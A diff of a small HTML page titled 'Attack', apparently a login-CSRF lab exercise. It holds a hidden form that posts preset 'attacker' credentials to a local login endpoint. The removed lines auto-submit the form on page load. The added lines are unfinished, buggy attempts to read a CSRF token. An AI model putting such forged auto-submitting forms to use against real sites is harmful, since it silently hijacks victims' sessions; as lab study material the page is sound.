@@ -1,34 +1,52 @@
 <!DOCTYPE html>
 <html>
 
-<head> 
+<head>
 
     <title>Attack</title>
     <script type="module" src="/path/to/js.cookie.mjs"></script>
     <script nomodule defer src="/path/to/js.cookie.js"></script>
-    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet" media="screen">
+    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.0.0/css/bootstrap.min.css" rel="stylesheet"
+        media="screen">
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
 
-    <script> 
+    <script>
 
         // document.getElementsByClassName("form-inline")[0].submit();
+        //  var csrf_token_val = document.getElementsByName('csrf_token').innerHTML;
+        // console.log(csrf_token_val);
         window.onload = function () {
-            document.getElementsByClassName("form-inline")[0].submit();
-        
+            // alert("HI");
+            // var csrf_token_val = document.getElementsByName('csrf_token');
+            // console.log(csrf_token_val);
+            // document.getElementsByName('csrf_token').value = csrf_token_val;
+            // console.log(csrf_token_val);
+            
+
+            var formObj = document.getElementsByClassName('well');
+            alert("Input one value: " + formObj.csrf_token.value);
+            
+
+         
+   
+
+
         };
     </script>
 </head>
 
 <body>
     <div class="col-xs-4">
-    
+
         <!-- Login / create account form -->
         <div class="well">
             <form action="http://0.0.0.0:8080/login" method="post" class="form-inline">
+                <input type="hidden" name="csrf_token" id="test">
                 <p>Log in or create an account.</p>
                 <div class="form-group form-space">
-                    <input id="username" name="username" type="text" placeholder="Username" required class="form-control" value="attacker">
+                    <input id="username" name="username" type="text" placeholder="Username" required
+                        class="form-control" value="attacker">
                 </div>
                 <div class="form-group form-space">
                     <input id="userpass" name="password" type="password" placeholder="Password" value="URpwn3d" required
@@ -36,9 +54,9 @@
                 </div>
             </form>
         </div>
-    
+
     </div>
-    
+
 </body>
 
 
